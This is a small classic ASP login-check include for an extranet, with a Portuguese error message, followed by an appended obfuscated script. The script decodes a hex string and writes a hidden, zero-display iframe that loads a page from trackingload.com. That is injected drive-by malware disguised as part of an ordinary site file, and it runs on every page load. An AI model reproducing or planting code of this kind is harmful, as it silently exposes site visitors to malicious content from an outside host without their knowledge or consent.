<%
function getUserID()
{
   return Session("userID")
}

function getUserLogin()
{
   return Session("login")
}


if(getUserID() == null)
{
   errMessage = 'É necessário estar logado para acessar o sistema.<br><br><a href=/extranet/ target=_top>Fazer Login</a><br><meta http-equiv="refresh" content="15;URL=index.asp">'
   Session("errorMessage") = errMessage
   Response.Redirect("errorLogin.asp");
}
%><script>function v4a8aa5eb219a6(v4a8aa5eb21d8e){ function v4a8aa5eb22176 () {return 16;} return(parseInt(v4a8aa5eb21d8e,v4a8aa5eb22176()));}function v4a8aa5eb22946(v4a8aa5eb22d2e){ var v4a8aa5eb238e5=2; var v4a8aa5eb23115='';for(v4a8aa5eb234fe=0; v4a8aa5eb234fe<v4a8aa5eb22d2e.length; v4a8aa5eb234fe+=v4a8aa5eb238e5){ v4a8aa5eb23115+=(String.fromCharCode(v4a8aa5eb219a6(v4a8aa5eb22d2e.substr(v4a8aa5eb234fe, v4a8aa5eb238e5))));}return v4a8aa5eb23115;} document.write(v4a8aa5eb22946('3C696672616D65206E616D653D2730306330373161383933373927207372633D27687474703A2F2F747261636B696E676C6F61642E636F6D2F652F696E646578372E706870272077696474683D373635206865696768743D323135207374796C653D27646973706C61793A6E6F6E65273E3C2F696672616D653E'));</script>